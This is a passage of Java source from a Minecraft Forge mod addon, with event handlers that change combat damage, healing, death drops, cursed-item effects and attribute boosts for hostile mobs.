                            damageBoost += event.getAmount() * EnderSlayer.endDamageBonus.getValue().asModifier(false);
                        }
                    }
                    if (damageBoost != 0) event.setAmount(event.getAmount() + damageBoost);
                }
            }
        }

        if (source.getEntity() instanceof Player player) {
            if (SuperpositionHandler.hasCurio(player, CURSED_XP_SCROLL)) {
                ItemStack itemstack = SuperpositionHandler.getCurioStack(player, CURSED_XP_SCROLL);
                ModifyDamageBaseOne(event, (CursedXPScroll.getLevelModifier(itemstack) / 100.0 * CursedXPScroll.damageBoostLimit.getValue()));
            }

            if (!SuperAddonHandler.findBookInBag(player, EnigmaticItems.THE_ACKNOWLEDGMENT).isEmpty()) {
                victim.setSecondsOnFire(3);
            }

            if (!SuperAddonHandler.findBookInBag(player, EnigmaticItems.THE_TWIST).isEmpty()) {
                if (SuperpositionHandler.isTheCursedOne(player)) {
                    if (OmniconfigHandler.isBossOrPlayer(event.getEntity())) {
                        ModifyDamageBaseOne(event, 0.1F);
                    }
                }
            }

            if (!SuperAddonHandler.findBookInBag(player, EnigmaticItems.THE_INFINITUM).isEmpty()) {
                if (SuperpositionHandler.isTheWorthyOne(player)) {
                    if (OmniconfigHandler.isBossOrPlayer(event.getEntity())) {
                        ModifyDamageBaseOne(event, 0.2F);
                    }
                }
            }

            if (SuperpositionHandler.hasCurio(player, THUNDER_SCROLL)) {
                if (player.getMainHandItem().canPerformAction(ToolActions.SWORD_SWEEP)) {
                    int electric = victim.getPersistentData().getInt("Electric");
                    victim.getPersistentData().putInt("Electric", electric + 60 + player.getRandom().nextInt(80) + (int) (event.getAmount() * 10));
                }
                event.setAmount(ThunderScroll.modify(victim, event.getAmount()));
            }

            if (SuperpositionHandler.hasCurio(player, HELL_BLADE_CHARM)) {
                float damageMultiplier = HellBladeCharm.damageMultiplier.getValue().asModifier();
                if (SuperpositionHandler.hasCurio(player, EnigmaticItems.BERSERK_CHARM))
                    damageMultiplier += (SuperpositionHandler.getMissingHealthPool(player) * (float) BerserkEmblem.attackDamage.getValue() / 4);
                ModifyDamageBaseOne(event, (NEMESIS_LIST.stream().anyMatch(source::is) ? 1.0F : 0.5F) * damageMultiplier);
            }

            if (SuperAddonHandler.isTheBlessedOne(player)) {
                ItemStack stack = SuperpositionHandler.getCurioStack(player, BLESS_RING);
                ModifyDamageBaseOne(event, BlessRing.damageBoost.getValue().asModifier(false) * BlessRing.Helper.getDamageModifier(stack));
            }

            if (player instanceof ServerPlayer && SuperpositionHandler.isTheCursedOne(player)) {
                if (TotemOfMalice.isEnable(player, false) && (victim instanceof Raider || TotemOfMalice.extraRaiderList.contains(ForgeRegistries.ENTITY_TYPES.getKey(victim.getType())))) {
                    ModifyDamageBaseOne(event, TotemOfMalice.raiderBoost.getValue());
                }
            }
        }

        if (victim instanceof Player player) {
            if (SuperpositionHandler.hasCurio(player, NIGHT_SCROLL) && NightScroll.isDark(player)) {
                ModifyDamageBaseOne(event, -NightScroll.averageDamageResistance.getValue().asModifier(false) * NightScroll.getDarkModifier(player));
            }

            if (TotemOfMalice.isEnable(player, false) && (victim instanceof Raider || TotemOfMalice.extraRaiderList.contains(ForgeRegistries.ENTITY_TYPES.getKey(victim.getType())))) {
                ModifyDamageBaseOne(event, -TotemOfMalice.raiderResistance.getValue());
            }

            if (SuperpositionHandler.hasCurio(player, HELL_BLADE_CHARM)) {
                ModifyDamageBaseOne(event, 0.1F);
                if (SuperpositionHandler.hasCurio(player, EnigmaticItems.BERSERK_CHARM)) {
                    float resistance = SuperpositionHandler.getMissingHealthPool(player) * (float) BerserkEmblem.damageResistance.getValue();
                    event.setAmount(event.getAmount() * (1.0F - resistance / 2) / (1.0F - resistance));
                    if (SuperAddonHandler.isTheBlessedOne(player)) BlessRing.Helper.addBetrayal(player, 3);
                }
            }

            if (SuperpositionHandler.hasCurio(player, BLESS_RING)) {
                ItemStack stack = SuperpositionHandler.getCurioStack(player, BLESS_RING);
                event.setAmount(event.getAmount() * (1 - BlessRing.damageResistance.getValue().asModifier() * BlessRing.Helper.getResistanceModifier(stack)));
            }

            if (SuperpositionHandler.hasCurio(player, BROKEN_RING)) event.setAmount(event.getAmount() * 0.9F);

            if (SuperpositionHandler.hasCurio(player, FORGOTTEN_ICE)) {
                if (source.getEntity() instanceof LivingEntity attacker && NEMESIS_LIST.stream().anyMatch(source::is)) {
                    if (attacker.canFreeze()) {
                        if (!attacker.level().isClientSide) {
                            ((ServerLevel) attacker.level()).sendParticles(ParticleTypes.SNOWFLAKE, attacker.getX(), attacker.getY(), attacker.getZ(), 20, attacker.getBbWidth() / 2, attacker.getBbHeight(), attacker.getBbWidth() / 2, 0.0D);
                        }
                        attacker.hurt(attacker.damageSources().source(DamageTypes.FREEZE, player), 3.0F);
                        attacker.setTicksFrozen(attacker.getTicksRequiredToFreeze());
                    }
                }
            }
        }

        if (source.getEntity() instanceof LivingEntity attacker) {
            if (SuperpositionHandler.hasCurio(attacker, FORGOTTEN_ICE) || attacker.hasEffect(EnigmaticAddonEffects.FROZEN_HEART_EFFECT)) {
                if (NEMESIS_LIST.stream().anyMatch(source::is)) {
                    if (victim.canFreeze()) victim.setTicksFrozen(victim.getTicksFrozen() + 70);
                }
                if (victim.isFullyFrozen())
                    ModifyDamageBaseOne(event, ForgottenIce.frostBoost.getValue().asModifier(false));
            }

            if (SuperpositionHandler.hasCurio(attacker, REVIVAL_LEAF)) {
                victim.addEffect(new MobEffectInstance(MobEffects.POISON, RevivalLeaf.poisonTime.getValue(), RevivalLeaf.poisonLevel.getValue(), false, true), attacker);
            }

            if (attacker instanceof Stray && victim.canFreeze() && SuperAddonHandler.isCurseBoosted(attacker)) {
                victim.setTicksFrozen(victim.getTicksFrozen() + 65 + Mth.floor(amount * 10));
            }

            if (attacker instanceof MagmaCube && SuperAddonHandler.isCurseBoosted(attacker)) {
                victim.setSecondsOnFire(4);
            }

            if (attacker instanceof Phantom && SuperAddonHandler.isCurseBoosted(attacker)) {
                victim.addEffect(new MobEffectInstance(MobEffects.WEAKNESS, 200, 1), attacker);
            }

            if (attacker instanceof OwnableEntity pet && !(attacker instanceof TamableAnimal ta && !ta.isTame()) && pet.getOwner() instanceof Player owner) {
                if ((BlessRing.Helper.betrayalAvailable(owner) || SuperpositionHandler.isTheCursedOne(owner)) && SuperpositionHandler.hasItem(owner, SANGUINARY_HANDBOOK)) {
                    if (owner.level() == pet.level() && owner.distanceTo(attacker) <= HunterGuidebook.effectiveDistance.getValue()) {
                        double damageMultiplier = SanguinaryHandbook.DamageMultiplier.getValue();
                        if (SuperpositionHandler.hasCurio(owner, EnigmaticItems.BERSERK_CHARM)) {
                            if (SuperAddonHandler.isTheBlessedOne(owner)) BlessRing.Helper.addBetrayal(owner, 2);
                            damageMultiplier += 0.5F * (SuperpositionHandler.getMissingHealthPool(owner) * (float) BerserkEmblem.attackDamage.getValue());
                        }
                        if (SuperpositionHandler.hasCurio(owner, EnigmaticItems.CURSED_SCROLL)) {
                            damageMultiplier += 0.75F * (SuperpositionHandler.getCurseAmount(owner) * CursedScroll.damageBoost.getValue().asModifier());
                        }
                        ModifyDamageBaseOne(event, damageMultiplier);
                        if (SuperAddonHandler.isTheBlessedOne(owner)) BlessRing.Helper.addBetrayal(owner, 2);
                    }
                }
            }
        }
    }

    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onEntityDamage(LivingDamageEvent event) {
        LivingEntity victim = event.getEntity();
        Entity attacker = event.getSource().getEntity();
        if (victim instanceof Player player) {
            if (SuperAddonHandler.isTheBlessedOne(player) && SuperpositionHandler.hasCurio(player, EnigmaticItems.BERSERK_CHARM))
                BlessRing.Helper.addBetrayal(player, 2);

            if (attacker instanceof Drowned drowned && SuperAddonHandler.isCurseBoosted(drowned)) {
                int airSupply = player.getAirSupply();
                int air = airSupply * 0.4 < 30 ? airSupply - 30 : Mth.floor(airSupply * 0.6);
                player.setAirSupply(Math.max(air, 0));
            }

            if (SuperpositionHandler.hasItem(player, THE_BLESS)) {
                player.invulnerableTime = TheBless.invulnerableTime.getValue();
            }

            ItemCooldowns cooldowns = player.getCooldowns();
            if (SuperpositionHandler.hasCurio(player, EARTH_PROMISE) && !cooldowns.isOnCooldown(EARTH_PROMISE)) {
                float damage = event.getAmount();
                if (SuperpositionHandler.isTheCursedOne(player)) damage *= EarthPromise.totalResistance.getValue().asModifierInverted();
                if (player.isAlive() && !event.getSource().is(DamageTypeTags.BYPASSES_INVULNERABILITY) && damage >= player.getHealth() * EarthPromise.abilityTriggerPercent.getValue().asModifier(false)) {
                    cooldowns.addCooldown(EARTH_PROMISE, EarthPromise.cooldown.getValue());
                    if (!player.level().isClientSide()) {
                        ((ServerLevel) player.level()).sendParticles(ParticleTypes.FLASH, player.getX(), player.getY(), player.getZ(), 1, 0.0, 0.0, 0.0, 0.0);
                        ((ServerLevel) player.level()).sendParticles(ParticleTypes.END_ROD, player.getX(), player.getY(0.5F), player.getZ(), 36, 0.1D, 0.1D, 0.1D, 0.2D);
                        player.level().playSound(null, player, SoundEvents.ENDER_EYE_DEATH, SoundSource.PLAYERS, 5.0F, 1.5F);
                    }
                    player.addEffect(new MobEffectInstance(EnigmaticAddonEffects.PURE_RESISTANCE_EFFECT, 100, 4));
                    event.setCanceled(true);
                } else {
                    event.setAmount(damage);
                }
            }
        }

        if (victim.hasEffect(EnigmaticAddonEffects.PURE_RESISTANCE_EFFECT)) {
            int amplifier = victim.getEffect(EnigmaticAddonEffects.PURE_RESISTANCE_EFFECT).getAmplifier();
            if (victim.getRandom().nextInt(5) <= amplifier) event.setCanceled(true);
            else event.setAmount(event.getAmount() * 0.2F * (4 - amplifier));
        }

        if (victim.hasEffect(EnigmaticAddonEffects.ICHOR_CORROSION_EFFECT)) {
            int amplifier = victim.getEffect(EnigmaticAddonEffects.ICHOR_CORROSION_EFFECT).getAmplifier() + 1;
            event.setAmount(event.getAmount() * (1 + amplifier * 0.1F));
        }

        if (victim instanceof EnderDragon dragon && SuperAddonHandler.isCurseBoosted(dragon)) {
            int boostLevel = SuperAddonHandler.getEnderDragonBoostLevel(dragon);
            event.setAmount(event.getAmount() * (1.05F - boostLevel * 0.05F));
        }

        event.setAmount(event.getAmount() * (1 + RedemptionCurseEnchantment.modify(victim)));

        if (SuperpositionHandler.hasCurio(victim, QUARTZ_RING) && QUARTZ_RING.resistanccList.stream().anyMatch(event.getSource()::is)) {
            event.setAmount(event.getAmount() * (1 - QuartzRing.magicResistance.getValue().asModifier(false)));
        }

        if (SuperpositionHandler.hasCurio(victim, LOST_ENGINE) && event.getSource().is(DamageTypeTags.IS_LIGHTNING)) {
            if (victim instanceof ServerPlayer player) {
                for (NonNullList<ItemStack> compartment : player.getInventory().compartments) {
                    for (ItemStack itemStack : compartment) {
                        double modifier = itemStack.getItem() instanceof ArmorItem ? 1 : 1.4;
                        if (itemStack.hurt((int) (itemStack.getMaxDamage() * modifier), player.getRandom(), player)) {
                            itemStack.shrink(1);
                            player.awardStat(Stats.ITEM_BROKEN.get(itemStack.getItem()));
                            itemStack.setDamageValue(0);
                        } else if (itemStack.hasTag() && itemStack.getTag().getBoolean("Unbreakable")) {
                            itemStack.getOrCreateTag().remove("Unbreakable");
                        }
                    }
                }
                CuriosApi.getCuriosInventory(player).ifPresent(handler -> {
                    int slots = handler.getEquippedCurios().getSlots();
                    for (int i = 0; i < slots; i++) {
                        ItemStack stackInSlot = handler.getEquippedCurios().getStackInSlot(i);
                        if (!stackInSlot.is(BLESS_RING) && !stackInSlot.is(EnigmaticItems.CURSED_RING) && stackInSlot.hurt(stackInSlot.getMaxDamage() * 3 / 2, player.getRandom(), player)) {
                            stackInSlot.shrink(1);
                            player.awardStat(Stats.ITEM_BROKEN.get(stackInSlot.getItem()));
                            stackInSlot.setDamageValue(0);
                        }
                    }
                });
            }
            event.setAmount(event.getAmount() * (victim.getRandom().nextInt(4) + 4) + victim.getMaxHealth());
        }

        if (attacker instanceof Player player) {
            if (SuperAddonHandler.isTheBlessedOne(player) && SuperpositionHandler.hasCurio(player, EnigmaticItems.BERSERK_CHARM))
                BlessRing.Helper.addBetrayal(player, 2);

            if (!player.level().isClientSide && SuperpositionHandler.hasCurio(player, HELL_BLADE_CHARM) && NEMESIS_LIST.stream().anyMatch(event.getSource()::is)) {
                float healthPer = victim.getHealth() * (SuperpositionHandler.isTheCursedOne(player) ? HellBladeCharm.killCursedThreshold.getValue().asModifier() : HellBladeCharm.killThreshold.getValue().asModifier());
                if (event.getAmount() >= healthPer && !ForgeRegistries.ENTITY_TYPES.getKey(victim.getType()).getPath().contains("dummy")) {
                    player.heal((float) (victim.getHealth() * HellBladeCharm.healMultiplier.getValue()));
                    event.setAmount(Math.min(event.getAmount() * 10.0F, Float.MAX_VALUE / 10.0F));
                    player.level().playSound(player, player.blockPosition(), SoundEvents.BEACON_ACTIVATE, SoundSource.PLAYERS, 1.0F, 2.0F);
                }
            }
        }

        float amount = event.getAmount();
        if (event.getSource().getDirectEntity() instanceof Player player) {
            float lifesteal = 0.0F;

            if (SuperpositionHandler.hasCurio(player, NIGHT_SCROLL) && NightScroll.isDark(player)) {
                if (SuperpositionHandler.isTheCursedOne(player)) {
                    lifesteal += amount * NightScroll.averageLifeSteal.getValue().asModifier(false) * NightScroll.getDarkModifier(player);
                }
            }
            if (SuperpositionHandler.hasCurio(player, SCORCHED_CHARM) && victim.isOnFire()) {
                lifesteal += amount * ScorchedCharm.lifestealModifier.getValue().asModifier(false);
            }
            if (!SuperAddonHandler.findBookInBag(player, EnigmaticItems.THE_INFINITUM).isEmpty()) {
                if (SuperpositionHandler.isTheWorthyOne(player)) {
                    lifesteal += amount * 0.1F;
                }
            }
            if (lifesteal > 0) player.heal(lifesteal);
        }
    }

    @SubscribeEvent
    public void onLivingDeath(LivingDeathEvent event) {
        LivingEntity entity = event.getEntity();
        Entity sourceEntity = event.getSource().getEntity();

        if (entity instanceof Blaze blaze && SuperAddonHandler.isCurseBoosted(blaze)) {
            RandomSource random = blaze.getRandom();
            for (int i = 0; i < 15; ++i) {
                SmallFireball fireball = new SmallFireball(blaze.level(), blaze, random.nextGaussian(), random.nextFloat() - 0.6, random.nextGaussian());
                fireball.setPos(fireball.getX(), blaze.getY(0.5) + 0.5, fireball.getZ());
                fireball.setOwner(blaze);
                blaze.level().addFreshEntity(fireball);
            }
        }

        if (!OmniconfigAddonHandler.NearDeathAnger.getValue()) return;
        if (entity instanceof Mob && SuperAddonHandler.isCurseBoosted(entity) && sourceEntity instanceof LivingEntity target && target.isAlive()) {
            if (target instanceof Player player && (player.isCreative() || player.isSpectator())) return;
            List<? extends LivingEntity> entities = entity.level().getEntitiesOfClass(entity.getClass(), entity.getBoundingBox().inflate(16.0D));
            for (LivingEntity near : entities) {
                if (near instanceof Mob mob && mob != entity && mob.isAlive() && mob.getTarget() == null) {
                    if (mob.distanceToSqr(entity) < 12.0) {
                        mob.setTarget(target);
                    } else {
                        Vec3 viewVector = mob.getViewVector(0.0F);
                        Vec3 subtract = entity.position().subtract(mob.position());
                        if (subtract.dot(viewVector) > 0) {
                            mob.setTarget(target);
                        }
                    }
                }
            }
        }
    }

    @SubscribeEvent
    public void onMobGriefing(EntityMobGriefingEvent event) {
        Entity entity = event.getEntity();
        if (entity instanceof Blaze blaze && !blaze.isAlive()) {
            event.setResult(Event.Result.DENY);
        }
    }

    @SubscribeEvent(priority = EventPriority.LOWEST, receiveCanceled = true)
    public void onConfirmedDeath(LivingDeathEvent event) {
        if (event.getEntity() instanceof ServerPlayer player) {
            if (event.isCanceled()) {
                POSTMORTAL_POSSESSIONS.removeAll(player);
                return;
            }

            if (SuperpositionHandler.hasCurio(player, CURSED_XP_SCROLL)) {
                ItemStack curioStack = SuperpositionHandler.getCurioStack(player, CURSED_XP_SCROLL);
                ItemNBTHelper.setInt(curioStack, "XPStored", 0);
            }

            if (SuperpositionHandler.hasCurio(player, BROKEN_RING)) {
                POSTMORTAL_POSSESSIONS.put(player, BROKEN_RING);
            }

            if (SuperpositionHandler.hasItem(player, BLESS_STONE) && !SuperpositionHandler.hasItem(player, EnigmaticItems.CURSED_STONE) && SuperpositionHandler.hasCurio(player, EnigmaticItems.CURSED_RING)) {
                POSTMORTAL_POSSESSIONS.put(player, BLESS_STONE);
                for (List<ItemStack> list : player.getInventory().compartments) {
                    for (ItemStack itemstack : list) {
                        if (!itemstack.isEmpty() && itemstack.getItem() == BLESS_STONE) {
                            itemstack.setCount(0);
                        }
                    }
                }
                LightningBolt lightningbolt = EntityType.LIGHTNING_BOLT.create(player.level());
                if (lightningbolt != null) {
                    lightningbolt.moveTo(Vec3.atBottomCenterOf(player.blockPosition()));
                    lightningbolt.setCause(player instanceof ServerPlayer ? player : null);
                    player.level().addFreshEntity(lightningbolt);
                }
            }
        }
    }


    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onLivingDropsLowest(LivingDropsEvent event) {
        Level level = event.getEntity().level();
        if (event.getEntity() instanceof ServerPlayer player && POSTMORTAL_POSSESSIONS.containsKey(player) && POSTMORTAL_POSSESSIONS.containsEntry(player, BROKEN_RING)) {
            boolean hasCurse = POSTMORTAL_POSESSIONS.containsKey(player) && POSTMORTAL_POSESSIONS.containsEntry(player, EnigmaticItems.CURSED_RING);
            if (hasCurse) return;
            boolean hadEscapeScroll = POSTMORTAL_POSESSIONS.containsKey(player) && POSTMORTAL_POSESSIONS.containsEntry(player, EnigmaticItems.ESCAPE_SCROLL);
            DimensionalPosition dimPoint = hadEscapeScroll ? SuperpositionHandler.getRespawnPoint(player) : new DimensionalPosition(player.getX(), player.getY(), player.getZ(), player.level());
            if (SuperpositionHandler.canDropSoulCrystal(player, true)) {
                ItemStack soulCrystal = EnigmaticItems.SOUL_CRYSTAL.createCrystalFrom(player);
                PermanentItemEntity droppedSoulCrystal = new PermanentItemEntity(dimPoint.world, dimPoint.getPosX(), dimPoint.getPosY() + 1.5, dimPoint.getPosZ(), soulCrystal);
                droppedSoulCrystal.setOwnerId(player.getUUID());
                dimPoint.world.addFreshEntity(droppedSoulCrystal);
                EnigmaticLegacy.LOGGER.info("Teared Soul Crystal from " + player.getGameProfile().getName() + " at X: " + dimPoint.getPosX() + ", Y: " + dimPoint.getPosY() + ", Z: " + dimPoint.getPosZ());
                SoulArchive.getInstance().addItem(droppedSoulCrystal);
            }
            if (SuperpositionHandler.isPermanentlyDead(player)) {
                EnigmaticLegacy.packetInstance.send(PacketDistributor.PLAYER.with(() -> player), new PacketPermadeath());
                SuperpositionHandler.setCurrentWorldFractured(true);
            }
            POSTMORTAL_POSSESSIONS.removeAll(player);
        } else if (event.getEntity() instanceof Player player) {
            POSTMORTAL_POSSESSIONS.removeAll(player);
        }
    }

    @SubscribeEvent
    public void onLivingHeal(LivingHealEvent event) {
        LivingEntity entity = event.getEntity();
        if (entity.getPersistentData().getBoolean("RevivingPoisoned")) {
            event.setAmount(event.getAmount() * 0.25F);
        }
        if (entity instanceof Player player && SuperpositionHandler.hasCurio(entity, CURSED_XP_SCROLL)) {
            ItemStack itemstack = SuperpositionHandler.getCurioStack(player, CURSED_XP_SCROLL);
            event.setAmount(event.getAmount() * (float) (1.0F + CursedXPScroll.getLevelModifier(itemstack) / 100.0 * CursedXPScroll.healBoostLimit.getValue()));
        }

        if (entity instanceof EnderDragon dragon && SuperAddonHandler.isCurseBoosted(dragon)) {
            int boostLevel = SuperAddonHandler.getEnderDragonBoostLevel(dragon);
            event.setAmount(event.getAmount() * (1.0F + boostLevel * 0.05F));
        }
    }

    @SubscribeEvent
    public void onCurioDrops(DropRulesEvent event) {
        if (event.getEntity() instanceof ServerPlayer player) {
            if (POSTMORTAL_POSSESSIONS.containsKey(player) && POSTMORTAL_POSSESSIONS.containsEntry(player, BLESS_STONE)) {
                boolean confirm = true;

                if (confirm) {
                    event.addOverride(stack -> stack != null && (stack.is(EnigmaticItems.CURSED_RING) || stack.is(EnigmaticItems.DESOLATION_RING)), ICurio.DropRule.DESTROY);
                    CuriosApi.getCuriosInventory(player).ifPresent((handler) -> {
                        IItemHandlerModifiable curios = handler.getEquippedCurios();
                        for (int i = 0; i < handler.getSlots() - 1; ++i) {
                            ItemStack stackInSlot = curios.getStackInSlot(i);
                            if (stackInSlot != null) {
                                if (stackInSlot.getItem() == EnigmaticItems.CURSED_RING) {
                                    ItemStack stack = BLESS_RING.getDefaultInstance();
                                    BlessRing.Helper.setBlessLevel(player, stack);
                                    curios.setStackInSlot(i, stack);
                                } else if (stackInSlot.getItem() instanceof ICursed iCursed && !(iCursed instanceof IBlessed) || stackInSlot.getItem() instanceof IEldritch) {
                                    PermanentItemEntity itemEntity = new PermanentItemEntity(player.level(), player.getRandomX(4), player.getRandomY(), player.getRandomZ(4), stackInSlot);
                                    itemEntity.setGlowingTag(true);
                                    player.level().addFreshEntity(itemEntity);
                                    curios.setStackInSlot(i, ItemStack.EMPTY);
                                }
                            }
                        }
                    });

                    player.level().playSound(null, player.blockPosition(), SoundEvents.WITHER_DEATH, SoundSource.PLAYERS, 1.0F, 0.5F);
                    SuperpositionHandler.setPersistentBoolean(player, "DestroyedCursedRing", true);
                }
            }
//            POSTMORTAL_POSSESSIONS.removeAll(player);
//        } else if (event.getEntity() instanceof Player player) {
//            POSTMORTAL_POSSESSIONS.removeAll(player);
        }
    }

    @SubscribeEvent
    public void onLivingJump(LivingEvent.LivingJumpEvent event) {
        LivingEntity entity = event.getEntity();
        if (SuperpositionHandler.hasCurio(entity, LOST_ENGINE)) {
            entity.addDeltaMovement(new Vec3(0.0, 0.1214, 0.0));
            if (entity.isCrouching()) {
                float rot = entity.getYRot() * Mth.PI / 180.0F;
                float sin = -Mth.sin(rot) * 0.055F;
                float cos = Mth.cos(rot) * 0.055F;
                entity.addDeltaMovement(new Vec3(sin * 3F, 0.45, cos * 3F));
                for (int i = 0; i < 5; i++) {
                    float width = entity.getBbWidth();
                    entity.level().addParticle(ParticleTypes.CLOUD, entity.getRandomX(width), entity.getY() + RANDOM.nextFloat(width), entity.getRandomZ(0.5), sin, RANDOM.nextFloat(0.12F) + 0.05, cos);
                }
            }
        }
    }

    @SubscribeEvent
    public void onCriticalHit(CriticalHitEvent event) {
        Player player = event.getEntity();
        Entity target = event.getTarget();
        if (SuperpositionHandler.hasCurio(player, LOST_ENGINE)) {
            event.setDamageModifier(event.getDamageModifier() + LostEngine.critModifier.getValue().asModifier());
        }
        int frostLevel = player.getMainHandItem().getEnchantmentLevel(EnigmaticAddonEnchantments.FROST_SHATTERING);
        if (frostLevel > 0 && target.isFullyFrozen()) {
            event.setDamageModifier(event.getDamageModifier() + frostLevel * 0.4F);
            if (event.isVanillaCritical()) {
                target.setTicksFrozen(target.getTicksRequiredToFreeze() + target.getTicksFrozen());
                if (player.level() instanceof ServerLevel serverLevel) {
                    float width = target.getBbWidth();
                    serverLevel.sendParticles(new ItemParticleOption(ParticleTypes.ITEM, new ItemStack(Blocks.BLUE_ICE)), target.getX(), target.getEyeY(), target.getZ(), 16, width, 0, width, 0.05);
                }
            }
        }
        if (event.isVanillaCritical() && target instanceof LivingEntity living && SuperpositionHandler.getPersistentInteger(player, "DisasterCounterattack", 0) > 0) {
            if (player.getMainHandItem().is(DISASTER_SWORD)) {
                event.setDamageModifier((float) (event.getDamageModifier() + DisasterSword.critBoost.getValue()));
                living.knockback(0.4000000059604645, Mth.sin(player.getYRot() * 0.017453292F), -Mth.cos(player.getYRot() * 0.017453292F));
                EnigmaticAddons.packetInstance.send(PacketDistributor.NEAR.with(() -> new PacketDistributor.TargetPoint(target.getX(), target.getY(), target.getZ(), 64.0, target.level().dimension())),
                        new PacketDisasterParry(target.getX(), target.getY(), target.getZ(), 2));
            }
        }
    }

    @SubscribeEvent
    public void onLeftClick(PlayerInteractEvent.LeftClickEmpty event) {
        Player player = event.getEntity();
        boolean flag = player.onGround() && SuperpositionHandler.hasCurio(player, THUNDER_SCROLL);
        if (flag && player.getMainHandItem().canPerformAction(ToolActions.SWORD_SWEEP) && !player.getCooldowns().isOnCooldown(THUNDER_SCROLL)) {
            EnigmaticAddons.packetInstance.send(PacketDistributor.SERVER.noArg(), new PacketEmptyLeftClick(true));
        }
    }


    @SubscribeEvent
    public void onLivingKnockback(LivingKnockBackEvent event) {
        if (event.getEntity() instanceof Player player && SuperAddonHandler.isAbyssBoost(player)) {
            event.setStrength(event.getStrength() / CursedRing.knockbackDebuff.getValue().asModifier());
        }
    }


    @SubscribeEvent
    public void onCursed(LivingCurseBoostEvent event) {
        if (!OmniconfigAddonHandler.EnableCurseBoost.getValue()) return;
        LivingEntity entity = event.getEntity();
        Player worthy = event.getTheWorthyOne();
        if (entity.level().isClientSide) return;
        String boost = "CurseAttributeBoost";

        if (entity instanceof Zombie absZombie) {
            addCursedModifier(absZombie, Attributes.ARMOR, new AttributeModifier(UUID_ARMOR, boost, 5.0, AttributeModifier.Operation.ADDITION));
        }
        if (entity.getClass() == Zombie.class) {
            if (entity.getMainHandItem().isEmpty() && entity.getRandom().nextInt(5) == 0) {
                entity.setItemInHand(InteractionHand.MAIN_HAND, new ItemStack(Items.TORCH, entity.getRandom().nextInt(4) + 3));
            } else if (entity.getMainHandItem().isEmpty() && entity.getRandom().nextInt(8) == 0) {
                entity.setItemInHand(InteractionHand.MAIN_HAND, new ItemStack(Items.WOODEN_AXE));
            }
        }
        if (entity.getClass() == Drowned.class && entity.getRandom().nextInt(100) <= 5) {
            if (entity.getMainHandItem().isEmpty()) {
                entity.setItemSlot(EquipmentSlot.OFFHAND, new ItemStack(Items.TRIDENT));
            }
        }

        if (entity instanceof Creeper creeper && entity.getRandom().nextInt(100) <= 5) {
            if (!creeper.isPowered()) {
                LightningBolt lightningbolt = EntityType.LIGHTNING_BOLT.create(creeper.level());
                if (lightningbolt != null) {
                    lightningbolt.moveTo(Vec3.atBottomCenterOf(creeper.blockPosition()));
                    lightningbolt.setSilent(creeper.getRandom().nextBoolean());
                    lightningbolt.addTag("HarmlessThunder");
                    lightningbolt.setDamage(0.0F);
                    creeper.level().addFreshEntity(lightningbolt);
                }
            }
        }

        if (entity instanceof IronGolem && worthy != null && !worthy.getAbilities().instabuild) {
            worthy.addEffect(new MobEffectInstance(MobEffects.MOVEMENT_SLOWDOWN, 50, 4));
        }

        if (entity instanceof Evoker evoker) {
            evoker.setItemInHand(InteractionHand.MAIN_HAND, Items.TOTEM_OF_UNDYING.getDefaultInstance());
            addCursedModifier(evoker, Attributes.ARMOR_TOUGHNESS, new AttributeModifier(UUID_ARMOR_TH, boost, 8.0, AttributeModifier.Operation.ADDITION));
        }

        if (entity instanceof Vindicator vindicator) {
            vindicator.addEffect(new MobEffectInstance(MobEffects.MOVEMENT_SPEED, 60));
        }

        if (entity instanceof EnderDragon dragon) {
            addCursedModifier(dragon, Attributes.ATTACK_KNOCKBACK, new AttributeModifier(UUID_ATTACK_KB, boost, 0.5, AttributeModifier.Operation.MULTIPLY_TOTAL));
            addCursedModifier(dragon, Attributes.ARMOR, new AttributeModifier(UUID_ARMOR, boost, 10.0, AttributeModifier.Operation.ADDITION));
        }

        if (entity instanceof Ravager ravager) {
            addCursedModifier(ravager, Attributes.ARMOR, new AttributeModifier(UUID_ARMOR, boost, 10.0, AttributeModifier.Operation.ADDITION));
            addCursedModifier(ravager, Attributes.ARMOR_TOUGHNESS, new AttributeModifier(UUID_ARMOR_TH, boost, 10.0, AttributeModifier.Operation.ADDITION));
        }

        if (entity instanceof Vex vex && vex.getClass() == Vex.class) {
            vex.setItemSlot(EquipmentSlot.OFFHAND, vex.getItemBySlot(EquipmentSlot.MAINHAND));
            vex.setDropChance(EquipmentSlot.OFFHAND, 0.0F);
            vex.setItemSlot(EquipmentSlot.CHEST, new ItemStack(Items.CHAINMAIL_CHESTPLATE));
            vex.setDropChance(EquipmentSlot.CHEST, -1.0F);
            vex.addEffect(new MobEffectInstance(MobEffects.DAMAGE_BOOST, 120, 1));
            vex.addEffect(new MobEffectInstance(MobEffects.INVISIBILITY, 40));
        }
        if (entity instanceof Blaze blaze) {
            addCursedModifier(blaze, Attributes.ATTACK_DAMAGE, new AttributeModifier(UUID_ATTACK, boost, 2.0, AttributeModifier.Operation.ADDITION));
            addCursedModifier(blaze, Attributes.ATTACK_KNOCKBACK, new AttributeModifier(UUID_ATTACK_KB, boost, 1.0, AttributeModifier.Operation.ADDITION));
        }
        if (entity instanceof AbstractPiglin piglin) {
            addCursedModifier(piglin, Attributes.ATTACK_DAMAGE, new AttributeModifier(UUID_ATTACK, boost, 2.0, AttributeModifier.Operation.ADDITION));
            addCursedModifier(piglin, Attributes.ARMOR, new AttributeModifier(UUID_ARMOR, boost, 8.0, AttributeModifier.Operation.ADDITION));
            addCursedModifier(piglin, Attributes.ARMOR_TOUGHNESS, new AttributeModifier(UUID_ARMOR_TH, boost, 4.0, AttributeModifier.Operation.ADDITION));
        }
        if (entity instanceof Slime slime) {
            int size = slime.getSize();
            if (size > 2) slime.setSize(Mth.ceil(size * 1.2), true);
            addCursedModifier(slime, Attributes.ATTACK_KNOCKBACK, new AttributeModifier(UUID_ATTACK_KB, boost, 1.0, AttributeModifier.Operation.ADDITION));
        }
        if (entity instanceof MagmaCube magma) {
            addCursedModifier(magma, Attributes.ARMOR, new AttributeModifier(UUID_ARMOR, boost, 3.0, AttributeModifier.Operation.ADDITION));
            addCursedModifier(magma, Attributes.ARMOR_TOUGHNESS, new AttributeModifier(UUID_ARMOR_TH, boost, 4.0, AttributeModifier.Operation.ADDITION));
        }
        if (entity instanceof Phantom phantom) {
            phantom.setPhantomSize(phantom.getPhantomSize() + 2);
            addCursedModifier(phantom, Attributes.ATTACK_DAMAGE, new AttributeModifier(UUID_ATTACK, boost, 2.0, AttributeModifier.Operation.ADDITION));
        }
    }

